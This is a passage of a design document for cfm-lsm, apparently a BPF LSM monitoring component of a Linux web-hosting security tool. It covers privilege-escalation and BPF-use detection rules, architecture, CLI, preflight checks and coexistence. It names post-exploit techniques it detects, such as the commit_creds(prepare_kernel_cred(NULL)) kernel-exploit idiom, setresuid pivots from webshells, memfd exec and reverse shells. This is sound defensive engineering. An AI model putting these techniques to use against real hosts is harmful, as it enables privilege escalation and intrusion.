**False-positive profile.** Expected mid-volume during the monitor window
on any host that exercises PAM (every interactive `su`, every `sshd`
password auth, every `crond` PAM session). Operators are expected to
review the captured `(comm, exe_inode)` distribution and either accept
the noise as expected baseline or build an allow-list before any
enforce conversation.

### `CFML-CRED-002` — Privilege escalation without setuid path

| | |
|---|---|
| Hook | `task_fix_setuid` |
| Shipped default | `disabled` (operator opts in to `monitor`) |
| Enforce | Not available; enforce settings are downgraded to monitor with a warning |
| FP risk | Low — daemon walks `/usr/bin`, `/usr/sbin`, `/usr/libexec`, `/bin`, `/sbin` for setuid binaries and whitelists their filesystem+inode keys; operator can extend via `allow_exe` in `lsm.conf` |
| Perf impact | Cold — fires only on setuid-family syscalls (setresuid / setuid / setreuid / setfsuid), bounded by a single map lookup |

**Description.** One BPF program at `task_fix_setuid`. Reads the new
and old credential structs after the setuid syscall has written them.
Only continues when `new.euid == 0 && old.euid != 0` (non-root →
root). Then resolves `current->mm->exe_file`'s filesystem+inode key
and looks it up in `cfm_setuid_inodes`. If the key is NOT in the whitelist, the
process is gaining root via a setuid syscall from a binary that does
not carry the suid bit on disk — the canonical post-exploit
fingerprint where a kernel exploit installed root creds and the
attacker pivots through `setresuid(0,0,0)` from a webshell or
similar. Emit event; never block.

**Hook choice — task_fix_setuid, not cred_prepare.** The earlier
draft attached to `cred_prepare`, but `cred_prepare` runs inside
`prepare_creds()` *before* the caller has mutated `new->euid` —
at that point `new` is a byte-for-byte copy of `old`, so a
"non-root → root" gate is mathematically unsatisfiable and the
program emits zero events. `task_fix_setuid` fires from the setuid
syscall paths *after* the new cred's uid fields have been written,
so the comparison is meaningful. The narrower hook does mean
CRED-002 does not catch kernel exploits that install creds directly
via `commit_creds(prepare_kernel_cred(NULL))` without going through
a userspace setuid syscall; `CFML-CRED-003` is the complementary
monitor-only rule for that direct install path.

**Monitor-only by design.** Returning `-EPERM` from the cred-install
path can deadlock systemd helpers and pkexec mid-transition (kernel
auth bugs, polkit weirdness, container runtime cred manipulation).
The value is in the alert, not the block. `cfm lsm enable` silently
downgrades a `mode = enforce` setting on this policy to `monitor`
with a clear warning, so an operator who copies an enforce setting
from a different policy still gets safe behaviour.


### `CFML-CRED-003` — Direct root credential install

| | |
|---|---|
| Hook | `fentry/commit_creds` (optional per-policy telemetry; skipped when unavailable) |
| Shipped default | `disabled` (operator opts in to `monitor`) |
| Enforce | Not available; `fentry` is tracing, not an LSM decision point. Enforce settings are downgraded to monitor with a warning |
| FP risk | Low — emits only for non-root current credentials installing uid/euid 0 and suppresses transitions already observed by `task_fix_setuid` |
| Perf impact | Cold — fires on credential commits only; event path is gated by simple uid comparisons |

**Description.** A tracing program attaches to `commit_creds` and compares
the current task's active credential state with the credential pointer being
installed. It emits only when a non-root task (`old.uid != 0` and
`old.euid != 0`) installs root credentials (`new.uid == 0` and
`new.euid == 0`). The BPF side marks credential pointers observed by
`task_fix_setuid`; if `commit_creds` receives that exact pointer, CRED-003
suppresses its event and leaves the transition to `CFML-CRED-002`. This
keeps CRED-003 focused on direct credential installation paths that bypass
`task_fix_setuid`, such as kernel exploit payloads that call
`commit_creds(prepare_kernel_cred(NULL))`.

**Relationship to CRED-002.** CRED-002 is the setuid-family syscall view:
it has old/new credentials from the LSM hook and can apply the setuid-binary
inode whitelist. CRED-003 is the direct install view: it sees the final
`commit_creds` call even when no setuid syscall LSM hook fired. The rules are
therefore complementary rather than replacements. Operators should enable both
in monitor mode when investigating privilege-escalation attempts.

**Monitor-only by design.** `fentry/commit_creds` is telemetry, not an LSM
decision hook, so CRED-003 never blocks. If a kernel does not expose a usable
`commit_creds` tracing target, preflight reports only `CFML-CRED-003` as
unavailable; the rest of cfm-lsm remains usable and can still attach.

**Companion kernsec rule.** `KSEC-LSM-bpf-001` (in `internal/kernsec/`)
appends `bpf` to the operator's existing `lsm=` boot argument when
forced in `/etc/cfm/kernsec.conf`. Required on distros where `bpf` is
not in the default LSM list (most non-EL10 kernels). Opt-in via
`[rule "KSEC-LSM-bpf-001"] state = force`. Symmetric unmerge on disable.

### `CFML-BPF-001` — Unexpected BPF use

| | |
|---|---|
| Hook | `tracepoint/syscalls/sys_enter_bpf` |
| Shipped default | `disabled` (operator opts in to `monitor`) |
| Enforce | Not available; tracepoint is telemetry, not an LSM decision point. Enforce settings are downgraded to monitor with a warning |
| FP risk | Medium on hosts running observability or security agents that themselves load BPF |
| Perf impact | Negligible (only fires on `bpf()` syscall entry for map/program creation) |

**Description.** Reports `bpf()` syscall attempts for `BPF_MAP_CREATE`
and `BPF_PROG_LOAD` when the caller is not CFM itself or a small
allowlist of known distro/platform agents. Attempts by the
daemon-populated web/panel uid set are always reported, even if the
process name resembles a trusted helper. The event payload uses the
shared cfm-lsm ringbuf: `op=bpf_map_create` or `op=bpf_prog_load`,
`comm=<caller>`, and `path=<BPF command label>`.

**Rationale.** Unexpected BPF program loading is an advanced-threat
signal: successful attackers increasingly use eBPF for stealth,
packet inspection, credential capture, or persistence after they
already have meaningful local execution. Hosting web users and
panel-managed uids should not be creating BPF maps or loading BPF
programs during normal operation.

**Not baseline hardening.** This policy deliberately does not block.
The tracepoint observes attempts before syscall completion and
cannot provide a reliable LSM-style denial decision. Operators
should rely on `kernsec` for broad unprivileged BPF surface
reduction (`kernel.unprivileged_bpf_disabled`, BPF JIT hardening,
and related sysctls), then enable `CFML-BPF-001` only where
advanced-threat telemetry is desired.


## Out of scope (with rationale)

For each excluded policy ID, one short paragraph on what already covers
that ground. Reviewers and future maintainers will read this section
first when they ask "why doesn't `cfm-lsm` do X." These are permanent
decisions, not TODOs.

- **`CFML-EXEC-002` (TPE).** Composer, npm, pip, yarn, wp-cli, drush,
  and cPanel's own auto-installer all legitimately exec from per-user
  writable directories. The FP surface is wide and the whitelist
  becomes a permanent tuning treadmill. The realistic vector this rule
  targets (PHP execs `/tmp/dropped-binary`) is already covered by
  Imunify PD at the PHP layer, by CageFS at the FS layer on
  CloudLinux, and by `kernsec`'s `/tmp`, `/var/tmp`, `/dev/shm`
  `noexec` mount audit at the kernel layer. Adding a fourth layer for
  the same vector is not worth the operational cost.

- **`CFML-OBS-001` (ptrace lockdown).** `kernsec` already ships
  `kernel.yama.ptrace_scope=1` in its default Tier 1 ruleset
  (`internal/kernsec/profile.go:188`). Yama scope 1 already restricts
  non-root processes to ptracing only their own children — which is
  exactly the behaviour this LSM rule would have enforced. If a host
  wants the stricter "non-root cannot ptrace at all" semantics, the
  right answer is to add `kernel.yama.ptrace_scope=2` as a `kernsec`
  Tier 2 sysctl rule. One line of config, no new kernel hook.

- **`CFML-NET-001` (outbound per vhost).** `internal/outbound/`
  already implements per-uid NFLOG-based outbound observation
  (`internal/outbound/analyzer.go`) with sliding-window thresholds for
  SMTP, scan, and HTTP, with forensic enrichment and deduplication.
  The right way to deliver per-vhost outbound enforcement is to
  promote that existing path from observe to enforce, not to bolt a
  parallel BPF LSM implementation onto a different hook surface. As a
  bonus the NFLOG path works on EL8 without DKMS.

- **`CFML-FS-001` (SSH backdoor injection).** Genuinely valuable on
  paper, but on the stacks CFM targets the realistic attacker (a
  compromised PHP-FPM worker) is already inside CageFS on a CloudLinux
  host and physically cannot see `~/.ssh/authorized_keys` for
  arbitrary users. Non-caged users — rare on a typical cPanel /
  DirectAdmin deployment — would benefit, but not enough to justify
  the FS-hook implementation cost as a standalone CFM rule. If this
  ever becomes necessary it deserves its own proposal.

- **`CFML-FS-002` (cron persistence).** Same logic as `CFML-FS-001`.
  CageFS already prevents the realistic attacker from writing to cron
  paths.

- **`CFML-FS-003` (web-root suspicious file creation).** The
  correlation value (`.php` dropped within 30s of suspicious POST)
  belongs in `webdetector`, not in an LSM hook. The LSM hook would
  only generate the event; the decision logic is HTTP-layer
  correlation.

- **`CFML-CRED-001` (capability watch).** LVE and CageFS already
  constrain the realistic per-user capability surface on CloudLinux,
  and the remaining ground (capability deltas without uid transition)
  overlaps with what an LKRG-class kernel integrity tool would cover.
  The post-exploit cash-in we *do* care about — the moment the
  attacker uses an unexpected root credential — is now covered by
  `CFML-CRED-002` (syscall-mediated setuid transitions) and
  `CFML-CRED-003` (direct `commit_creds` installs).

- **`CFML-RATE-001`, `CFML-RATE-002` (segfault / fork rate
  throttling).** LVE owns per-user resource limits on CloudLinux. On
  non-CloudLinux hosts these would have value, but not enough to
  justify carrying the rate-limit machinery for two different host
  classes.

- **`CFML-SELF-001` (CFM self-protection).** Worth doing one day, but
  not via a BPF LSM hook in this MVP. A `fanotify` watch on the CFM
  binary / config tree is a much cheaper way to get the same signal,
  and `cfm-lsm` does not yet exist on disk for there to be anything
  to protect at the LSM layer.

- **`CFML-SELF-002` (module load lockdown post-boot).** Actively
  conflicts with KernelCare and Ksplice live-patch module loads,
  which are a core part of the CFM target stack. Implementing this
  rule would require maintaining a whitelist of every live-patch
  module suffix in perpetuity, which is brittle. `kernsec` already
  explicitly leaves `kernel.modules_disabled` unsupported for
  related reasons.

## Prior art — what to borrow (and what not to)


### Falco

What is reusable: Falco's **public rule corpus**. Their existing rules
`Memfd Create Then Execute` and `Reverse Shell` cover exactly the two
behaviours of this MVP. Their detection logic — memfd-backed exec via
inode and dentry inspection, reverse-shell via fd 0/1/2 socket-dup
walking — is the same shape this design lands on independently. The
practical value is in the exemption sets Falco has accumulated over
many production hosts: which build tools legitimately exec from memfd,
which container runtimes dup socket fds. Read the rules, lift the
exemption lists as a starting point, reimplement the detection
clean-room against BPF LSM hooks.


## Related future work

A complementary future component — a CFM-built Zend PHP extension that
intercepts dangerous PHP function calls at the VM layer, for hosts
without Imunify360 Proactive Defense — is described separately in
[`cfm-php.md`](./cfm-php.md). It is out of scope for `cfm-lsm` because
it operates at a different layer (PHP Zend VM, not kernel LSM hooks)
and is a different project on a different timeline. It is recorded
here only to answer the inevitable "why doesn't `cfm-lsm` block
dangerous PHP functions directly?" That work, if it happens, lives in
`cfm-php`, not here.

## Architecture

The implementation details below are sketches, not commitments. They
exist so a future implementer has a sane starting point, not so this
doc becomes a blocker on choosing a different approach later.

The shape is deliberately **not** "separate C daemon + DKMS module +
log file that CFM tails." That model would be the only CFM component
to work that way, would require running clang on every customer host,
and would invite the version-skew and IPC problems that come with a
second binary. Instead, `cfm-lsm` follows the same in-binary subsystem
pattern as `internal/outbound/` and `internal/kernsec/`.

### Backend

BPF LSM via CO-RE, loaded by the existing CFM Go daemon using
[`cilium/ebpf`](https://github.com/cilium/ebpf). No libbpf C
dependency on the runtime side; no kernel module; no DKMS. EL8 is
explicitly unsupported for `cfm-lsm`; EL8 hosts continue to rely on
`kernsec`, the existing `internal/outbound/` sentinel, and Imunify
(where licensed). Maintaining a DKMS LKM backend across
KernelCare-patched RHEL 8 kernels would be a perpetual maintenance
tax this MVP does not pay.

### Build model — no CGO, no clang on the install target

CFM builds with `CGO_ENABLED=0` (see `Makefile:53`). That stays true
for `cfm-lsm`. The mechanics:

- The BPF C sources live in-tree at `internal/lsm/bpf/*.bpf.c` with a
  CO-RE `vmlinux.h`.
- `go generate` invokes
  [`bpf2go`](https://github.com/cilium/ebpf/tree/main/cmd/bpf2go) from
  `cilium/ebpf`, which calls clang to produce the compiled BPF object
  plus Go bindings that wrap it.
- Release builders regenerate the compiled `.o` and Go bindings with
  `make bpf` when BPF C sources change. Feature PRs should not ship
  regenerated bytecode artifacts unless the release process explicitly
  requests them; this keeps review focused on source changes.
- `CGO_ENABLED=0` continues to work because `cilium/ebpf` is pure Go
  — it talks to the kernel via `bpf(2)` syscalls through
  `golang.org/x/sys/unix`, not via libbpf.
- The Go runtime loads the embedded bytecode, CO-RE-relocates it for
  the running kernel, and attaches it to LSM hooks. No clang on the
  customer host. No kernel headers on the customer host.

Build-time deps for **contributors who change the BPF programs**
(documented in a `## Building` section, separate from runtime
install): clang ≥ 11, libelf-dev, kernel headers ≥ 5.7 for
`vmlinux.h` regeneration, optionally `bpftool` for debugging.

Build-time deps for **everyone else** (downstream packagers,
end-user installs, CI that doesn't touch `.bpf.c`): none beyond
what CFM already needs.

### In-tree layout

```
internal/lsm/
├── bpf/
│   ├── cfmlsm.bpf.c           # all shipped BPF programs share this translation unit
│   ├── common.bpf.h           # shared helpers, map definitions, event struct
│   └── vmlinux.h              # CO-RE kernel type definitions (committed)
├── cfmlsm_x86_bpfel.{go,o}    # bpf2go output for x86-64 (release artifact)
├── cfmlsm_arm64_bpfel.{go,o}  # bpf2go output for arm64 (release artifact)
├── bpf_generate.go            # `go:generate` directive for bpf2go
├── policy.go                  # PolicyID constants, AllPolicies() catalogue
├── conf.go                    # /etc/cfm/lsm.conf parser + writer
├── loader.go                  # NewLoader / AdoptPinned / UnpinAll, pin layout
├── maps.go                    # daemon-side map population (uids, inodes, suid set)
├── enable.go                  # `cfm lsm enable` orchestration + pinning
├── lifecycle.go               # daemon-side adoption + notify emission
├── events.go                  # Go-side Event struct + wire-format parser
├── preflight.go               # kernel-capability checks
├── probe.go                   # `cfm lsm probe` (ephemeral attach)
├── status.go / preview.go     # read-only diagnostics
├── cli.go / init.go           # subcommand surface
├── kmsg.go                    # dmesg / /dev/kmsg emission
└── doc.go
```

### Runtime — single daemon, single unit, single config

A subsystem inside the existing CFM daemon, not a separate
`cfm-lsmd` process. The reasoning: BPF event delivery is in-process
already (the ringbuf reader is a goroutine), LSM event processing
is not crash-prone enough to justify a second daemon, and the
host-profile detection code lives in the existing binary already
(`internal/kernsec/profile.go`). Reuse, don't fork.

There is no "cfm-lsmd writes a log file that cfm watches" seam.
Events flow from the ringbuf reader goroutine onto the same
in-process channel that `internal/outbound/` already feeds into the
notify, JSON-log, and webdetector-correlation paths.

A single systemd unit (the existing `cfm.service`). A single config
file. A single log destination (`/var/log/cfm/lsm.jsonl`).

### Privileges

BPF LSM loading needs `CAP_BPF` + `CAP_PERFMON` + `CAP_SYS_ADMIN`.
The CFM daemon already runs with the privileges it needs for
nftables and NFLOG (see `configs/cfm.service` for the existing
hardening profile); the additional caps required for BPF LSM
attach are within the same envelope and do not require a privilege
boundary split. If a future iteration of CFM ever drops the main
daemon to a lower-cap user, the cleanest split is a small one-shot
`cfm-lsm-loader` helper that attaches programs at start and exits
— not a long-running second daemon. That is a refinement for later,
not part of the MVP.

### Host-profile reuse

Consume the existing detection in `internal/kernsec/profile.go`
(cPanel, DirectAdmin, CloudLinux / LVE, CageFS, Imunify360,
KernelCare, Ksplice, Proxmox, ZFS, EFI). Do not reimplement
detection.

### Event shape

Match the per-uid event shape that `internal/outbound/analyzer.go`
already emits, so downstream pipeline code can consume both sources
symmetrically. The BPF programs write a minimal fixed-size struct
into a per-CPU ringbuf; the Go side enriches it (pid → cgroup → user
→ vhost) before forwarding to the event bus.

### Config

`/etc/cfm/lsm.conf`, INI-style, same format as
`/etc/cfm/kernsec.conf`. The earlier draft proposed TOML; align with
the existing format in the rest of CFM instead. Three modes per
policy: `disabled`, `monitor`, `enforce` — with the latter downgraded
to `monitor` for `CFML-CRED-002`, `CFML-CRED-003`, `CFML-EXEC-005`,
and `CFML-BPF-001` because those hooks are not safe LSM decision
points. Per-vhost overrides are reserved for future use; none of the
shipped policies is vhost-keyed.

Example monitor-first rollout for deleted/unlinked executable telemetry:

```ini
[policy "CFML-EXEC-004"]
mode = monitor
```

Promote only after reviewing local telemetry confirms backup agents,
deployment systems, and panel helpers are not producing legitimate
matches:

```ini
[policy "CFML-EXEC-004"]
mode = enforce
```

The `enforce` vs `monitor` decision is **compiled into the BPF
program at load time** via a `bpf2go` constant rewrite, so the hot
path does not branch on the mode and runtime cost is identical in
both modes.

### Watched-uid model

Several rules (`CFML-FS-005`, `CFML-FS-007`, `CFML-EXEC-004`,
`CFML-EXEC-006`) gate on whether the calling task's uid is in the
daemon-populated `cfm_watched_uids` BPF map. The set is built at
adoption time from three additive layers:

1. **Static `WebUserNames` + `WebUserNamePrefixes`.** Hardcoded list
   of system user names that are structurally web-class on any host:
   `apache`, `nginx`, `www-data`, `http`, `httpd`, `lighttpd`,
   `caddy`, `tomcat`, `php`, `lsphp`, `proxy`, `nobody`, plus the
   `alt-php-*` and `alt-php-fpm-*` prefix matches for CloudLinux
   per-version FPM workers. Always applied.

2. **Panel manifest contributions.** Every uid that owns a vhost in
   `/etc/userdomains` (cPanel) or DirectAdmin's domain-owners file.
   Always applied, best-effort — a missing manifest file is silently
   skipped.

3. **`watched_uid_fallback_min` uid-range sweep.** Every uid in
   `/etc/passwd` at or above this threshold joins the watched set.
   Configurable per host. The shipped default is `1000` — the
   `/etc/login.defs` UID_MIN convention on every modern distro —
   which watches every regular login account, including admins.
   Set to `0` to disable this layer entirely.

The historical `-1` "auto" sentinel (default = 1000 if no panel
manifest is detected, else disabled) was removed in favour of the
explicit default. The auto-detect created a silent coverage gap on
panel hosts: a sysadmin account added via `adduser chris` before
DirectAdmin was installed would not appear in the DA vhost-owner
manifest, and the auto-fallback would skip the uid-range sweep that
would otherwise have watched them. An attacker who compromised
`chris` would then evade every watched-uid-gated rule. `-1` is still
accepted as a deprecated alias for `1000`; the daemon emits a
one-time warning at adoption when it sees the legacy value.

**Migration notes — panel hosts upgrading from `-1`.** This is a
**behaviour change** for hosts that previously ran with
`watched_uid_fallback_min = -1` AND had a cPanel/DirectAdmin
manifest. Under the old model the fallback was silently skipped, so
only the static `WebUserNames` and the panel-manifest uids were
watched. Under the new model the fallback applies at 1000, so
admin / sysadmin accounts at uid >= 1000 join the watched set —
which means previously-silent uids may start producing FS-005 /
FS-007 / EXEC-004 / EXEC-006 events. Three migration paths:

| Goal | Set in `/etc/cfm/lsm.conf` |
|---|---|
| Preserve the old behaviour exactly (panel-manifest + static names only) | `watched_uid_fallback_min = 0` |
| Adopt the new coverage; opt-out your known-trusted admin accounts | `watched_uid_fallback_min = 1000` plus `exclude_user = <admin>` / `exclude_uid = N` / `exclude_gid = N` |
| Adopt the new coverage broadly (default) | `watched_uid_fallback_min = 1000` (shipped default; no edits needed) |

Then run `cfm lsm restart`. The daemon emits the one-time deprecation
warning on adoption if it sees `-1`, with the same recipes inline.

**Excluding known-trusted accounts.** Operators who want the broad
coverage of `watched_uid_fallback_min = 1000` but need to silence
specific accounts (the host's own sudoers, batch-job uids, build
service accounts) declare exclusions in `lsm.conf`:

```ini
watched_uid_fallback_min = 1000
exclude_user = chris        # by name; resolved at adoption time
exclude_user = devops
exclude_uid  = 1001         # by numeric uid
exclude_gid  = 10           # every uid in this primary group
```

The exclude lists are applied **after** the three additive layers
have built the watched set, so excluding an admin doesn't drop
coverage of any other uid. Names that don't resolve at adoption
time skip silently (operators commonly carry a single lsm.conf
across heterogeneous hosts where not every admin account exists
everywhere). The match dimensions are independent — a uid is
excluded if ANY of the three lists matches.

This model fails closed: newly-added user accounts are watched
automatically; the operator opts out specific trusted accounts
explicitly. The previous model required the operator to remember to
update the watched set when adding new accounts; the new model
mirrors the rest of cfm-lsm's allowlist-by-explicit-trust pattern.

## How it works — lifecycle, CLI, and kernel preflight

cfm-lsm separates **detection** (kernel-level, BPF programs attached
to LSM hooks) from **event collection** (userspace, the cfm daemon
drains the ringbuf). The split matters because protection has to be
reliable across daemon restarts — block decisions happen inside the
kernel, independent of whether userspace is alive.

### Default state — off

cfm-lsm ships **disabled by default**. A fresh install does not
attach any BPF programs. The operator opts in by running
`cfm lsm enable` once. From then on the attachments survive cfm
daemon restarts, crashes, and `systemctl stop cfm` — only an
explicit `cfm lsm disable` detaches.

### Kernel preflight

Before any load attempt, seven things must hold. `cfm lsm status`
runs all seven and reports each one with a pass/fail/unknown verdict
and a specific remediation hint:

1. **Kernel version (informational).** Read from `/proc/version`.
   Reported but NOT a gate: RHEL-family vendor kernels backport BPF
   LSM to 4.18 (verified on AlmaLinux 8.10), so a uname comparison
   is the wrong proxy for capability. Capability is decided by the
   bpf-lsm-program-type probe below.
2. **`CONFIG_BPF_LSM=y` in the running kernel.** Verified via
   `/proc/config.gz` or `/boot/config-$(uname -r)`. Shipped enabled
   on AlmaLinux 8.6+ / 9+ / 10, CloudLinux 8 / 9+, RHEL 8.6+ / 9+,
   Debian 12+, Ubuntu 22.04+. Useful diagnostic, but on its own
   not sufficient — see (7).
3. **`bpf` in `/sys/kernel/security/lsm`.** EL-family stock kernels
   include `bpf` in the compile-time default LSM list. Debian /
   Ubuntu typically need the operator to add `bpf` to the kernel
   `lsm=` command line. The preflight prints the exact line to
   write to GRUB / `/etc/default/grub` / `/etc/kernel/cmdline`
   based on the detected bootloader.
4. **`/sys/kernel/btf/vmlinux` exists.** Required for CO-RE
   relocation. Present on AlmaLinux 8.6+, RHEL 9+, Debian 12+,
   Ubuntu 22.04+, and newer.
5. **The process has `CAP_BPF + CAP_PERFMON` or `CAP_SYS_ADMIN`.**
   `cfm` runs as root in production, so this passes; running an
   unprivileged `cfm lsm status` will see this check FAIL and
   the remediation prints the systemd `AmbientCapabilities=` line.
6. **`/sys/fs/bpf` mounted as type `bpf`.** bpffs is required for
   the pin-to-disk path. Systemd has mounted bpffs by default
   since v229 so this passes on every modern distro; the check
   exists for the rare stripped-down host.
7. **`BPF_PROG_TYPE_LSM` accepted by the bpf() syscall.** The
   authoritative capability gate: attempts a tiny no-op LSM program
   load via cilium/ebpf's `features.HaveProgramType(ebpf.LSM)`.
   Returns PASS when the verifier engages, FAIL when the kernel
   rejects the program type at dispatch (EINVAL). Required because
   some vendor kernels (notably CloudLinux 8's lve kernel) set
   `CONFIG_BPF_LSM=y` for the kernel-internal subsystem but do not
   expose the program type to userspace; this probe is the only
   way to tell those hosts apart from genuinely capable ones.

Preflight is read-only and can be run by anyone at any time —
it does not touch the kernel. Optional per-policy probes are reported
separately from component-wide preflight. Today that means
`CFML-CRED-003` checks whether `commit_creds` is visible as a tracing
target; if it is unavailable, `cfm lsm status` and `cfm lsm probe` report
that policy as unavailable but do not mark the whole LSM component failed
or prevent other enabled policies from attaching.

### CLI surface

| Command | Behaviour |
|---|---|
| `cfm lsm` | Alias for `cfm lsm status`. Read-only. |
| `cfm lsm status [--json]` | Preflight + lsm.conf state + live pinned attach state. Read-only. |
| `cfm lsm preview` | Predicts what `cfm lsm enable` would attach given the current conf + kernel. Read-only; never opens the kernel. |
| `cfm lsm init` | One-shot bring-up: preflight + enable + status. Requires `/etc/cfm/lsm.conf` to exist already (install the rpm/deb or copy `configs/lsm.conf` from the source tree). Idempotent: skips enable when already pinned. |
| `cfm lsm enable` | Loads, attaches, and pins the BPF programs + ringbuf map to `/sys/fs/bpf/cfm/`. Programs stay attached past daemon and CLI exit. Needs root. |
| `cfm lsm disable` | Removes everything pinned under `/sys/fs/bpf/cfm/`. The kernel detaches the programs when the last reference drops. Needs root. |
| `cfm lsm help` | Usage. |

Three planned subcommands not in this MVP — `cfm lsm test`
(synthetic-trigger verification), `cfm lsm policy <id>` (detail
view), `cfm lsm reload` (hot policy reload) — are explicitly out
of scope for the first release and will land in subsequent
proposals.

### Two-process model

cfm-lsm runs across two cooperating processes:

**The CLI (`cfm lsm enable`)** loads the BPF programs and attaches
each to its LSM hook (`bprm_check_security`, `task_fix_setuid`, the
six `inode_*` write hooks, `task_alloc`, and `fentry/commit_creds`
depending on the policy). It then *pins* the programs, the shared
ringbuf, and the daemon-populated allow/watch maps to bpffs under
`/sys/fs/bpf/cfm/`. After pinning, the CLI exits. The bpffs entries
keep their own kernel references, so the programs stay attached even
though no userspace process holds a fd on them. This is the standard
kernel idiom for "BPF program that outlives the loader."

**The cfm daemon** runs the
`internal/lsm/lifecycle.go` adoption path. On every config-reload
tick it checks two things: `enabled = true` in `/etc/cfm/lsm.conf`,
AND the pinned state exists at `/sys/fs/bpf/cfm/`. If both, the
daemon calls `AdoptPinned()` to open the pinned map, starts a
goroutine that drains the ringbuf, and forwards every detection
into the existing CFM notify pipeline (`notify.Event` with
`kind=lsm_detect`, `section=lsm`). Daemon shutdown closes the
userspace fds; the pinned programs stay attached at the kernel
level.

### What survives daemon downtime

| State change | Detection | Event collection |
|---|---|---|
| daemon running | works | events streamed live |
| daemon stopped (`systemctl stop cfm`) | **still works** | events buffer in ringbuf, drop when full |
| daemon crashed | **still works** | events buffer in ringbuf, drop when full |
| `cfm lsm disable` | **stopped** | n/a |

Audit emission is best-effort: a full or unavailable ringbuf may drop
the userspace event, but it does **not** change an established LSM
verdict. In monitor mode, a matched `CFML-EXEC-001` or
`CFML-EXEC-003` exec is still allowed if `bpf_ringbuf_reserve()`
fails; in enforce mode, the same matched exec is still denied.

Ringbuf size is 256 KiB; at the per-event size of 112 bytes that's
about 2,300 events before drops. EXEC-001 is a rare event in
practice (memfd exec is post-exploit only); EXEC-003 likewise.
Operators who care about full event capture during daemon
downtime can increase the ringbuf size in a follow-up.

### Pin layout on disk

```
/sys/fs/bpf/cfm/
├── maps/
│   ├── cfm_events             # shared ringbuf map (BPF_MAP_TYPE_RINGBUF)
│   ├── cfm_watched_uids       # FS-005 watched uids (web-class users)
│   ├── cfm_watched_inodes     # FS-005 sensitive (dev, inode) pairs
│   └── cfm_setuid_inodes      # CRED-002 setuid-binary (dev, inode) pairs
└── links/
    ├── cfm_memfd_exec               # CFML-EXEC-001 — bprm_check_security
    ├── cfm_revshell                 # CFML-EXEC-003 — bprm_check_security
    ├── cfm_fs005_setattr            # CFML-FS-005 — inode_setattr
    ├── cfm_fs005_create             # CFML-FS-005 — inode_create
    ├── cfm_fs005_unlink             # CFML-FS-005 — inode_unlink
    ├── cfm_fs005_link               # CFML-FS-005 — inode_link
    ├── cfm_fs005_rename             # CFML-FS-005 — inode_rename
    ├── cfm_fs005_setxattr           # CFML-FS-005 — inode_setxattr
    ├── cfm_fs005_mark_exec          # CFML-FS-005 origin marker — bprm_check_security
    ├── cfm_fs005_mark_setuid        # CFML-FS-005 origin marker — task_fix_setuid
    ├── cfm_fs005_mark_task_alloc    # CFML-FS-005 origin marker — task_alloc
    ├── cfm_cred002                  # CFML-CRED-002 — task_fix_setuid
    └── cfm_cred003                  # CFML-CRED-003 — fentry/commit_creds
```

Each file is an actual bpffs file with its own kernel refcount.
Removing a file via `rm` is equivalent to `cfm lsm disable` for
that entry — the kernel detaches the program when the last
reference drops. Operators can inspect the layout with `ls -la`
or `bpftool prog show` / `bpftool link show`.

### Failure modes and what happens

| Condition | CFM behaviour |
|---|---|
| Kernel rejects `BPF_PROG_TYPE_LSM` at bpf() syscall | Preflight fail on `bpf-lsm-program-type` (the authoritative gate); `cfm-lsm` unavailable; daemon runs normally. Observed on CloudLinux 8 lve kernels which set `CONFIG_BPF_LSM=y` for the internal subsystem only. |
| `CONFIG_BPF_LSM` absent | Preflight fail with "kernel was built without BPF LSM support; use a distro kernel that ships CONFIG_BPF_LSM=y (AlmaLinux 8.6+ / 9+ / 10, CloudLinux 9+, RHEL 9+, Debian 12+, Ubuntu 22.04+) or rebuild with CONFIG_BPF_LSM=y." |
| `bpf` not in `/sys/kernel/security/lsm` | Preflight fail with the exact remediation: which file to edit (`/etc/default/grub`, `/etc/kernel/cmdline`, or BLS entry), the `lsm=…` line to write, and the boot-args refresh command for the detected bootloader. |
| `vmlinux` BTF missing | Preflight fail; CO-RE not possible on this kernel. |
| Verifier rejects program | Log the verifier log at error level; mark that one policy as `failed`; other policies continue. |
| One LSM hook attach fails | Log; that one policy becomes `unavailable`; others continue. |
| Ringbuf full | Drop events with a counter increment; surfaced in `cfm lsm status`. |

The principle, lifted directly from `kernsec`'s posture: never break
the host. A misconfigured or unsupported `cfm-lsm` reduces to a no-op
plus a clear log message, never to a crashed daemon or a wedged
machine.

## Coexistence

**Imunify360 Proactive Defense.** Imunify PD is a Zend extension
hooking `zend_execute_ex` / `zend_execute_internal`; it sees PHP VM
calls only. `cfm-lsm` operates at LSM hooks one layer below; they are
complementary, not redundant. PD blocks the call that launches a
reverse shell; `cfm-lsm` blocks the resulting process if PD missed it
or was not loaded into that SAPI. The forward-looking analogue of
Imunify PD for non-Imunify hosts has its own design doc — see
[`cfm-php.md`](./cfm-php.md).

**CageFS / LVE.** CageFS namespaces away most FS-write vectors for
PHP-FPM workers on CloudLinux. `CFML-EXEC-001` / `CFML-EXEC-003` /
`CFML-CRED-002` / `CFML-CRED-003` are CageFS-orthogonal and do not
duplicate it. `CFML-FS-005` complements it: a caged user reaching a
watched path means caging was bypassed, which is itself a compromise
indicator. LVE's fork / PMEM / EP limits are not touched.

**KernelCare / Ksplice.** Live-patch modules load post-boot. cfm-lsm
does not constrain module loading at all, so there is nothing to
whitelist. (This is one of the reasons `CFML-SELF-002` is out of
scope.)

**Stacked LSMs (SELinux / AppArmor / Yama / Lockdown).** The Linux LSM
stack runs each LSM in sequence; any LSM can deny, all must permit.
SELinux or AppArmor, where present, runs before `cfm-lsm`; their
denials never reach this layer. Yama runs alongside;
`kernel.yama.ptrace_scope=1` is already shipped by `kernsec`. Lockdown
runs alongside and is recommended at `integrity` but not required.
Tomoyo and Smack are untested and not on CFM's supported distros.

## Phased roadmap

All five policies are shipped and attached by the existing Loader
and lifecycle code. The MVP pair (`CFML-EXEC-001`, `CFML-EXEC-003`)
landed first, followed by FS-005 + CRED-002 once the MVP's verifier
and pinning behaviour proved stable on EL10, and finally CRED-003 to
close the documented direct-`commit_creds` gap. Each new policy is
folded into the same `cfmlsm.bpf.c` translation unit and attached
through the existing pinned-link / pinned-map model — no new
component shape per policy.

**Kernsec integration — KSEC-LSM-bpf-001.** Adding `bpf` to the
kernel `lsm=` command line is owned by `kernsec` via rule
`KSEC-LSM-bpf-001` (Tier 2, not forced by default). Forcing the
rule in `/etc/cfm/kernsec.conf` makes `cfm kernsec apply` merge
`bpf` into the operator's existing `lsm=` value without disrupting
the other LSMs; takes effect on the next reboot. Required on
distros where `bpf` is not in the compile-time default LSM list
(most non-EL10 kernels).

## Adding a new policy

